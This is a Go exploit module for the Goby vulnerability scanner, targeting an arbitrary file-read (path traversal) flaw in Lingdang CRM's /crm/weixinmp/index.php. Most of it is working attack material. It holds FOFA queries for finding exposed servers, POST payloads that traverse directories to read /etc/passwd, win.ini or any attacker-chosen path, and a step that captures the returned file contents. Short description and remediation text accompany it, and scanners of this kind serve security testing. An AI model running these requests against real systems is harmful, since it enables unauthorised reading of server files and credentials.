package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Lingdang CRM /crm/weixinmp/index.php File Read Vulnerability",
    "Description": "<p>Lingdang CRM is a CRM software developed by Shanghai Lingdang Information Technology Co., Ltd., suitable for small and medium-sized enterprises. This vulnerability exists in the /crm/weixinmp/index.php file of Lingdang CRM, allowing attackers to exploit a file inclusion vulnerability to read arbitrary files on the server, potentially leading to sensitive information disclosure or further server privilege escalation.</p>",
    "Product": "Lingdang CRM",
    "Homepage": "https://www.51mis.com/product/",
    "DisclosureDate": "2025-01-03",
    "PostTime": "2025-01-15",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "body=\"crmcommon/js/jquery/jquery-1.10.1.min.js\" || (body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\")",
    "GobyQuery": "body=\"crmcommon/js/jquery/jquery-1.10.1.min.js\" || (body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\")",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files on the server through a file inclusion vulnerability, potentially leading to sensitive information disclosure, data tampering, and further privilege escalation.</p>",
    "Recommendation": "<p>It is recommended to upgrade Lingdang CRM to the latest version immediately and perform strict input validation on the file inclusion functionality to prevent unverified file paths from being input. Additionally, restrict file access permissions on the server to prevent sensitive files from being read.</p>",
    "References": [
        "https://github.com/BxYQ/ld/blob/main/Playforrecord_fileread.doc"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd,C:/Windows/win.ini",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "C:/Windows/system32/drivers/etc/hosts",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/crm/weixinmp/index.php?userid=123&module=Users&usid=1&action=UsersAjax&minipro_const_type=1&related_module=Singin",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "file=../../../modules/Accounts/Playforrecord&download=/etc/passwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/crm/weixinmp/index.php?userid=123&module=Users&usid=1&action=UsersAjax&minipro_const_type=1&related_module=Singin",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "file=../../../modules/Accounts/Playforrecord&download=C:/Windows/win.ini"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "; for 16-bit app support",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/crm/weixinmp/index.php?userid=123&module=Users&usid=1&action=UsersAjax&minipro_const_type=1&related_module=Singin",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "file=../../../modules/Accounts/Playforrecord&download={{{filePath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "灵当 CRM /crm/weixinmp/index.php 文件读取漏洞",
            "Product": "Lingdang CRM",
            "Description": "<p>灵当 CRM 是由上海铃铛信息技术有限公司开发的一款适用于中小型企业的 CRM 软件。该漏洞存在于 灵当 CRM 的 /crm/weixinmp/index.php 文件中，攻击者可以通过构造恶意请求利用文件包含漏洞读取服务器上的任意文件，从而可能导致敏感信息泄露或进一步的服务器权限获取。</p>",
            "Recommendation": "<p>建议立即升级 Lingdang CRM 至最新版本，并对文件包含功能进行严格的输入验证，避免用户输入未经验证的文件路径。同时，限制服务器上的文件访问权限，防止敏感文件被读取。</p>",
            "Impact": "<p>该漏洞允许攻击者通过文件包含漏洞读取服务器上的任意文件，可能导致敏感信息泄露、数据篡改以及进一步的权限提升。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Lingdang CRM /crm/weixinmp/index.php File Read Vulnerability",
            "Product": "Lingdang CRM",
            "Description": "<p>Lingdang CRM is a CRM software developed by Shanghai Lingdang Information Technology Co., Ltd., suitable for small and medium-sized enterprises. This vulnerability exists in the /crm/weixinmp/index.php file of Lingdang CRM, allowing attackers to exploit a file inclusion vulnerability to read arbitrary files on the server, potentially leading to sensitive information disclosure or further server privilege escalation.</p>",
            "Recommendation": "<p>It is recommended to upgrade Lingdang CRM to the latest version immediately and perform strict input validation on the file inclusion functionality to prevent unverified file paths from being input. Additionally, restrict file access permissions on the server to prevent sensitive files from being read.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files on the server through a file inclusion vulnerability, potentially leading to sensitive information disclosure, data tampering, and further privilege escalation.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/crm/weixinmp/index.php"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9983"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
